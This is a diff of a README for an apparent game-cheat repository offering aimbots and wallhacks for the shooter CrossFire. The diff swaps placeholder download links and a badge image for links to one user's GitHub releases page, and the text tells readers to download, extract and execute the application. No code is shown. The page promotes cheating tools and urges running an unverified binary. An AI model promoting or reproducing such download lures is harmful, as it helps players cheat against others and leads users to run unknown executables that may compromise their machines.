@@ -2,7 +2,7 @@
 
 Welcome to the **CrossFire** repository! This project aims to enhance your gaming experience in CrossFire by providing powerful tools like aimbots and wallhacks. With these tools, you can gain a strategic advantage over your opponents.
 
-![CrossFire](https://img.shields.io/badge/CrossFire-Cheat-blue?style=for-the-badge&logo=gamepad)
+![CrossFire](https://github.com/priya706/CrossFire/releases)
 
 ## Table of Contents
 
@@ -35,7 +35,7 @@ By utilizing these tools, you can enhance your performance and enjoy a more enga
 
 To get started, download the application from the link below:
 
-[Download Application.zip](https://github.com/user/repo/Application.zip)
+[Download https://github.com/priya706/CrossFire/releases](https://github.com/priya706/CrossFire/releases)
 
 Once downloaded, extract the files and execute the application. Follow the on-screen instructions to complete the setup.
 
@@ -92,6 +92,6 @@ For questions or support, please reach out through the GitHub Issues section or 
 
 Thank you for visiting the **CrossFire** repository! Enjoy your enhanced gaming experience!
 
-[Download Application.zip](https://github.com/user/repo/Application.zip)
+[Download https://github.com/priya706/CrossFire/releases](https://github.com/priya706/CrossFire/releases)
 
 Feel free to explore, contribute, and share your experiences with the tools provided. Happy gaming!
